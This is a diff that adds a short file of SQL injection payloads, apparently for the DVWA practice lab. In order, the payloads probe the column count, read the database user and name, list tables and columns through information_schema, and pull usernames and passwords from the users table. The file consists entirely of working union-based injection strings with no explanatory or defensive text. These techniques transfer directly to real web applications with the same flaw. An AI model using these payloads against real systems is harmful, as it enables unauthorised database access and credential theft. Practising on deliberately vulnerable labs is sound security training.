@@ -1,0 +1,12 @@
+1' order by 2#
+
+1' union select user(),database()#
+
+
+0' union select 1,group_concat(table_name) from information_schema.tables where table_schema='dvwa'#
+
+
+
+0' union select 1,group_concat(column_name) from information_schema.columns where table_schema='dvwa' and table_name='users'#
+
+0' union select user,password from dvwa.users limit 0,1#
